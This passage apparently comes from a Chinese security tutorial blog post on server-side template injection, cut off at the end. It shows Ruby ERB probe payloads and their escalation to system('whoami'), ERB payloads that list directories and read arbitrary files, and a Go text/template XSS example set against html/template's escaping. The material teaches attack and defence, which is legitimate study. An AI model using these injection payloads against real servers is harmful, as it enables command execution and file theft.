&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vQ29Mby9wLzE1NTA3NzM4Lmh0bWwjJUU2JUJDJThGJUU2JUI0JTlFJUU1JUE0JThEJUU3JThFJUIw&#34;&gt;Java 安全之 Thymeleaf SSTI 分析 - Zh1z3ven - 博客园 (cnblogs.com)&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;ruby&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ruby&#34;&gt;#&lt;/a&gt; ruby&lt;/h2&gt;
&lt;h3 id=&#34;erb&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#erb&#34;&gt;#&lt;/a&gt; ERB&lt;/h3&gt;
&lt;p&gt;ERB 的文档的语法如图所示&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1651151342_626a91eef3e9ef68f1aa4.png!small&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;p&gt;对主页面下进行 &lt;code&gt;/?message&lt;/code&gt;  的参数探测，发现可以输入 &lt;code&gt;/?message&lt;/code&gt; &lt;br&gt;
 再构造探测的 Payload，并将其转换为 url 编码&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;%= 7*7 %&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221203111704891.png&#34; alt=&#34;image-20221203111704891&#34;&gt;&lt;/p&gt;
&lt;p&gt;回显 “49” 正是存在 SSTI 的证明，于是我们将 &lt;code&gt;7*7&lt;/code&gt;  进行修改，改成任意命令注入的形式 system (“whoami”)`&lt;/p&gt;
&lt;p&gt;ERB 引擎的安全文档指出可以列出所有目录，然后按如下方式读取任意文件。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%= Dir.entries(&amp;#x27;/&amp;#x27;) %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;%= File.open(&amp;#x27;/example/arbitrary-file&amp;#x27;).read %&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzMzMTY1My5odG1s&#34;&gt;从 0 到 1 完全掌握 SSTI - FreeBuf 网络安全行业门户&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDUxNTgzNi9hcnRpY2xlL2RldGFpbHMvMTEzNzc4MjMz&#34;&gt;(71 条消息) ssti 详解与例题以及绕过 payload 大全_HoAd’s blog 的博客 - CSDN 博客_ssti 绕过&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMTMwNzg3&#34;&gt;一文了解 SSTI 和所有常见 payload 以 flask 模板为例 - 腾讯云开发者社区 - 腾讯云 (tencent.com)&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;go&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#go&#34;&gt;#&lt;/a&gt; go&lt;/h2&gt;
&lt;p&gt;Go 提供了两个模板包。一个是  &lt;code&gt;text/template&lt;/code&gt; ，另一个是 &lt;code&gt;html/template&lt;/code&gt; 。text/template 对 XSS 或任何类型的 HTML 编码都没有保护，因此该模板并不适合构建 Web 应用程序，而 html/template 与 text/template 基本相同，但增加了 HTML 编码等安全保护，更加适用于构建 web 应用程序&lt;/p&gt;
&lt;p&gt;template 之所以称作为模板的原因就是其由静态内容和动态内容所组成，可以根据动态内容的变化而生成不同的内容信息交由客户端&lt;/p&gt;
&lt;h3 id=&#34;texttemplate&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#texttemplate&#34;&gt;#&lt;/a&gt; text/template&lt;/h3&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;package main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import (&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;net/http&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;text/template&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type User struct &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ID       int&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Name  string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Email    string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Password string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;func StringTpl2Exam(w http.ResponseWriter, r *http.Request) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    user := &amp;amp;User&amp;#123;1,&amp;quot;John&amp;quot;, &amp;quot;test@example.com&amp;quot;, &amp;quot;test123&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.ParseForm()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    tpl := `&amp;lt;h1&amp;gt;Hi, &amp;#123;&amp;#123; .Name &amp;#125;&amp;#125;&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;Your Email is &amp;#123;&amp;#123; .Email &amp;#125;&amp;#125;`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data := map[string]string&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;Name&amp;quot;:  user.Name,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;Email&amp;quot;: user.Email,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    html := template.Must(template.New(&amp;quot;login&amp;quot;).Parse(tpl))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    html.Execute(w, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;func main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server := http.Server&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Addr: &amp;quot;127.0.0.1:8888&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    http.HandleFunc(&amp;quot;/string&amp;quot;, StringTpl2Exam)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server.ListenAndServe()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;struct 是定义了的一个结构体，在 go 中，我们是通过结构体来类比一个对象，因此他的字段就是一个对象的属性，在该实例中，我们所期待的输出内容为下&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;模板内容 &amp;lt;h1&amp;gt;Hi, &amp;#123;&amp;#123; .Name &amp;#125;&amp;#125;&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;Your Email is &amp;#123;&amp;#123; .Email &amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;期待输出 &amp;lt;h1&amp;gt;Hi, John&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;Your Email is test@example.com&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221204114031009.png&#34; alt=&#34;image-20221204114031009&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看得出来，当传入参数可控时，就会经过动态内容生成不同的内容，而我们又可以知道，go 模板是提供字符串打印功能的，我们就有机会实现 xss&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;package main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import (&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;net/http&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;text/template&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type User struct &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ID       int&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Name  string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Email    string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Password string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;func StringTpl2Exam(w http.ResponseWriter, r *http.Request) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    user := &amp;amp;User&amp;#123;1,&amp;quot;John&amp;quot;, &amp;quot;test@example.com&amp;quot;, &amp;quot;test123&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.ParseForm()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    tpl := `&amp;lt;h1&amp;gt;Hi, &amp;#123;&amp;#123;&amp;quot;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&amp;quot;&amp;#125;&amp;#125;&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;Your Email is &amp;#123;&amp;#123; .Email &amp;#125;&amp;#125;`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data := map[string]string&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;Name&amp;quot;:  user.Name,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;Email&amp;quot;: user.Email,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    html := template.Must(template.New(&amp;quot;login&amp;quot;).Parse(tpl))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    html.Execute(w, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;func main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server := http.Server&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Addr: &amp;quot;127.0.0.1:8888&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    http.HandleFunc(&amp;quot;/string&amp;quot;, StringTpl2Exam)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server.ListenAndServe()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;模板内容 &amp;lt;h1&amp;gt;Hi, &amp;#123;&amp;#123;&amp;quot;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&amp;quot;&amp;#125;&amp;#125;&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;Your Email is &amp;#123;&amp;#123; .Email &amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;期待输出 &amp;lt;h1&amp;gt;Hi, &amp;#123;&amp;#123;&amp;quot;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&amp;quot;&amp;#125;&amp;#125;&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;Your Email is test@example.com&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;实际输出 弹出/xss/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里就是 text/template 和 html/template 的最大不同了&lt;/p&gt;
&lt;h3 id=&#34;htmltemplate&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#htmltemplate&#34;&gt;#&lt;/a&gt; html/template&lt;/h3&gt;
&lt;p&gt;同样的例子，但是我们把导入的模板包变成 html/template&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;package main&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import (&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;net/http&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;html/template&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;type User struct &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ID       int&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Name  string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Email    string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Password string&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;func StringTpl2Exam(w http.ResponseWriter, r *http.Request) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    user := &amp;amp;User&amp;#123;1,&amp;quot;John&amp;quot;, &amp;quot;test@example.com&amp;quot;, &amp;quot;test123&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    r.ParseForm()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    tpl := `&amp;lt;h1&amp;gt;Hi, &amp;#123;&amp;#123;&amp;quot;&amp;lt;script&amp;gt;alert(/xss/)&amp;lt;/script&amp;gt;&amp;quot;&amp;#125;&amp;#125;&amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt;Your Email is &amp;#123;&amp;#123; .Email &amp;#125;&amp;#125;`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    data := map[string]string&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;Name&amp;quot;:  user.Name,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;Email&amp;quot;: user.Email,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    html := template.Must(template.New(&amp;quot;login&amp;quot;).Parse(tpl))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    html.Execute(w, data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;func main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server := http.Server&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        Addr: &amp;quot;127.0.0.1:8888&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    http.HandleFunc(&amp;quot;/string&amp;quot;, StringTpl2Exam)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    server.ListenAndServe()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/640&#34; alt=&#34;图片&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到，xss 语句已经被转义实体化了，因此对于 html/template 来说，传入的 script 和 js 都会被转义，很好地防范了 xss，但 text/template 也提供了内置函数 html 来转义特殊字符，除此之外还有 js，也存在 &lt;code&gt;template.HTMLEscapeString&lt;/code&gt;  等转义函数&lt;/p&gt;
&lt;h3 id=&#34;template常用基本语法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#template常用基本语法&#34;&gt;#&lt;/a&gt; template 常用基本语法&lt;/h3&gt;
&lt;p&gt;在 &lt;code&gt;&amp;#123;&amp;#123;&amp;#125;&amp;#125;`内的操作称之为pipeline

